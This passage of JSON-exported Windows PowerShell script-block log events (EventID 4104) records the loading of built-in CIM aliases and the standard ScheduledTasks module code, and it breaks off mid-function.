    "EventRecordID": 72,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name rcms -Value Remove-cimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "db58842e-d8f8-4988-bf6c-742ae0679f5b",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843400Z"
    },
    "EventRecordID": 73,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name gcms -Value Get-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "98f6f12c-96b8-460f-aec8-ad78c9925346",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843404Z"
    },
    "EventRecordID": 74,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "835c6de2-44ef-4b22-88f6-d5766adde7b3",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 5,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:22.843406Z"
    },
    "EventRecordID": 75,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0002-B0A6-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
    "ScriptBlockId": "a68e191d-99c9-401b-b7c2-3c46535a6260",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.368191Z"
    },
    "EventRecordID": 76,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0003-9FA0-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask'\r\n$script:ClassVersion = ''\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='ByPath', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ByPath', Position=0, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='ByPath', Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('TaskName') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${TaskName})\r\n        $__cmdletization_queryBuilder.FilterByProperty('TaskName', $__cmdletization_values, $true, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('TaskPath') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${TaskPath})\r\n        $__cmdletization_queryBuilder.FilterByProperty('TaskPath', $__cmdletization_values, $true, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Unregister-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='ByPath', SupportsShouldProcess=$true, ConfirmImpact='High', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ByPath', Position=0, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='ByPath', Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ciminstance[]]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${AsJob},\r\n\r\n    [Parameter(ParameterSetName='ByPath')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${PassThru})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('TaskName') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${TaskName})\r\n        $__cmdletization_queryBuilder.FilterByProperty('TaskName', $__cmdletization_values, $true, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('TaskPath') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${TaskPath})\r\n        $__cmdletization_queryBuilder.FilterByProperty('TaskPath', $__cmdletization_values, $true, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n    switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('ByPath', 'InputObject (cdxml)') -contains $_ } {\r\n      $__cmdletization_returnValue = $null\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru\r\n            if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }\r\n            } else {\r\n                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)\r\n            }\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Unregister-ScheduledTask' -Alias '*'\r\n        \r\n",
    "ScriptBlockId": "1a595ed1-30ef-4c66-af89-509f6a0cda0c",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.412894Z"
    },
    "EventRecordID": 77,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 12,
    "ScriptBlockText": "\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'Root/Microsoft/Windows/TaskScheduler/PS_ScheduledTask'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Disable-ScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Name', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Name', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Name') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('DisableByName', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('DisableByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Disable-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Enable-ScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Name', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Name', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Name') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n        